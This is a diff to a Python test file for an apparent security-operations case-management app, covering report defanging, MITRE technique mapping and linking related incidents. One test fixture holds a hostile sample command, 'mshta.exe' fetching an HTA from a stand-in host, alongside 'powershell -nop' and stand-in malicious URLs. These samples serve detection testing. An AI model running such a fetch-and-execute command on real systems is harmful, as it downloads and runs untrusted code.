@@ -75,17 +75,17 @@ def test_case_children_report_and_exports(client):
     client.post(f"/api/cases/{cid}/actions", json={"text": "Blocked 185.220.101.1"}, headers=H)
     c = client.get(f"/api/cases/{cid}").get_json()
     assert c["techniques"][0]["tactic"] == "Execution"
-    md = client.post(f"/api/cases/{cid}/report/generate", json={}, headers=H).get_json()["markdown"]
+    md = client.post(f"/api/cases/{cid}/report/generate", json={"template": "technical"}, headers=H).get_json()["markdown"]
     for section in ("Quick Verdict", "Executive Summary", "Timeline", "Event Details", "Analysis", "Interpretation",
                     "Confidence Level", "Recommendations", "Actions Taken", "IOCs & Artifacts"):
         assert "## " in md and section in md, section
-    # indicators are always defanged and rendered as code
-    assert "`185[.]220[.]101[.]1`" in md and "`WS01`" in md and "185.220.101.1" not in md
-    assert "beacon to `185[.]220[.]101[.]1`" in md
+    # indicators are always defanged (final dot) and rendered as code
+    assert "`185.220.101[.]1`" in md and "`WS01`" in md and "185.220.101.1" not in md
+    assert "beacon to `185.220.101[.]1`" in md
     assert "https://attack.mitre.org/techniques/T1059/001/" in md  # reference links stay usable
     # even if an analyst pastes live indicators into the report, the saved copy is defanged
     saved = client.patch(f"/api/cases/{cid}", json={"report_md": md + "\nextra http://evil.example.net/x"}, headers=H).get_json()
-    assert "hxxp[://]evil[.]example[.]net/x" in saved["report_md"]
+    assert "hxxp://evil.example[.]net/x" in saved["report_md"]
     assert saved["assessment"]["verdict"] in ("inconclusive", "suspicious", "likely_malicious", "true_positive")
     for fmt in ("stix", "csv", "irflow", "report"):
         r = client.get(f"/api/cases/{cid}/export/{fmt}")
@@ -109,10 +109,10 @@ def test_arrange_is_ephemeral(client, tmp_path):
 
 
 def test_report_code_helper():
-    assert code("1.2.3.4") == "`1[.]2[.]3[.]4`"
+    assert code("1.2.3.4") == "`1.2.3[.]4`"
     assert code("1.2.3.4", defang=False) == "`1.2.3.4`"
     assert code("a`b") == "`` a`b ``"
-    assert code("http://evil.com", defang=True) == "`hxxp[://]evil[.]com`"
+    assert code("http://evil.com", defang=True) == "`hxxp://evil[.]com`"
     md = generate({"title": "t", "observables": [], "artifacts": [], "techniques": []})
     assert md.startswith("# Incident Report: t")
 
@@ -156,3 +156,70 @@ def test_relevance_filter_and_summary():
     assert "185[.]220[.]101[.]1" in out["summary"] and "MALICIOUS" in out["summary"] and "401" not in out["summary"]
     none = filter_report({**rep, "results": rep["results"][1:], "verdict": "error"})
     assert none["verdict"] == "unknown" and none["results"] == [] and "No reputation source" in none["summary"]
+
+
+def test_auto_mitre_and_hide_restore(client):
+    u = register(client)
+    ws = u["workspaces"][0]["id"]
+    cid = client.post(f"/api/workspaces/{ws}/cases", json={"title": "T"}, headers=H).get_json()["id"]
+    d = client.post(f"/api/cases/{cid}/techniques/from-logs", headers=H, json={
+        "products": ["Sysmon"], "items": [
+            {"technique_id": "T1059.001", "count": 4, "example": "powershell -nop"},
+            {"technique_id": "T1078", "count": 9, "example": "4624"},            # context-only: not mapped
+            {"technique_id": "T1003.001", "count": 1, "finding": "Credential dumping from LSASS"}]}).get_json()
+    tids = {t["technique_id"]: t for t in d["case"]["techniques"]}
+    assert d["added"] == 2 and set(tids) == {"T1059.001", "T1003.001"}
+    assert tids["T1059.001"]["auto"] and "Sysmon" in tids["T1059.001"]["basis"][0]
+    # evidence-derived mapping (artifact) appears without any click
+    client.post(f"/api/cases/{cid}/artifacts", json={"items": [{"kind": "command_line", "value": "mshta.exe http://x.example/a.hta"}]}, headers=H)
+    c = client.get(f"/api/cases/{cid}").get_json()
+    assert any(t["technique_id"] == "T1218.005" and t["id"] is None for t in c["techniques"])
+    c = client.post(f"/api/cases/{cid}/techniques/hide", json={"technique_id": "T1218.005"}, headers=H).get_json()
+    assert "T1218.005" not in {t["technique_id"] for t in c["techniques"]}
+    assert [h["id"] for h in c["techniques_hidden"]] == ["T1218.005"]
+    # re-arranging the same logs doesn't bring a hidden technique back
+    client.post(f"/api/cases/{cid}/techniques/hide", json={"technique_id": "T1059.001"}, headers=H)
+    d = client.post(f"/api/cases/{cid}/techniques/from-logs", headers=H, json={"items": [{"technique_id": "T1059.001", "count": 1}]}).get_json()
+    assert d["added"] == 0 and "T1059.001" not in {t["technique_id"] for t in d["case"]["techniques"]}
+    c = client.post(f"/api/cases/{cid}/techniques/restore", json={"technique_id": "T1218.005"}, headers=H).get_json()
+    assert "T1218.005" in {t["technique_id"] for t in c["techniques"]}
+
+
+def test_soc_report_with_related_records(client):
+    u = register(client)
+    ws = u["workspaces"][0]["id"]
+    alert = {"alert_name": "Suspicious sign-in", "customer": "Contoso"}
+    old = client.post(f"/api/workspaces/{ws}/cases", json={"title": "Earlier spray", **alert, "ticket_number": "INC0000042"},
+                      headers=H).get_json()["id"]
+    client.post(f"/api/cases/{old}/observables", json={"text": "45.77.12.9"}, headers=H)
+    client.patch(f"/api/cases/{old}", json={"status": "in_progress", "disposition": "incident"}, headers=H)
+    cid = client.post(f"/api/workspaces/{ws}/cases", json={"title": "New", **alert, "finding_id": "F-7",
+                                                            "alert_url": "https://security.microsoft.com/alerts/9"},
+                      headers=H).get_json()["id"]
+    client.post(f"/api/cases/{cid}/observables", json={"text": "45.77.12[.]9"}, headers=H)
+    r = client.post(f"/api/cases/{cid}/report/generate", json={}, headers=H).get_json()
+    assert r["outcome"] == 1 and r["target"] == "INC0000042"
+    assert r["markdown"].startswith('Appending finding "F-7" to "INC0000042"')
+    # analyst can force another outcome
+    r = client.post(f"/api/cases/{cid}/report/generate", json={"outcome": 3}, headers=H).get_json()
+    assert r["outcome"] == 3 and "https://security.microsoft.com/alerts/9" in r["markdown"]
+    saved = client.patch(f"/api/cases/{cid}", json={"report_md": r["markdown"]}, headers=H).get_json()
+    assert "https://security.microsoft.com/alerts/9" in saved["report_md"]  # alert link stays live after save
+    # imported records and pentest notes
+    d = client.post(f"/api/cases/{cid}/context", json={"text": '[{"_type": "fusion-closure", "detail": "x", "closed_by": "A"},'
+                                                               ' {"case number": "INC9", "status": "CLOSED"}]'}, headers=H).get_json()
+    assert d["imported"] == 2
+    assert client.post(f"/api/cases/{cid}/context", json={"text": "{bad"}, headers=H).status_code == 400
+    notes = client.post(f"/api/workspaces/{ws}/pentests", json={"title": "Q4 test", "customer": "Contoso",
+                                                                "tester_ips": "45.77.12.0/24, 198.51.100.7",
+                                                                "client_instruction": "unannounced"}, headers=H).get_json()
+    assert notes[0]["tester_ips"] == ["45.77.12.0/24", "198.51.100.7"]
+    ctx = client.get(f"/api/cases/{cid}/context").get_json()
+    assert len(ctx["records"]["closures"]) == 1 and len(ctx["records"]["pentests"]) == 1
+    assert {t["case_number"] for t in ctx["records"]["tickets"]} == {"INC0000042", "INC9"}
+    assert ctx["analysis"]["related"]["pentests"][0]["related"] is True
+    # closing a case as non-threatening makes it a past closure for later cases
+    client.patch(f"/api/cases/{old}", json={"status": "closed", "disposition": "non_threatening",
+                                            "close_notes": "Corporate VPN"}, headers=H)
+    ctx = client.get(f"/api/cases/{cid}/context").get_json()
+    assert any(c.get("closure_note") == "Corporate VPN" for c in ctx["records"]["closures"])
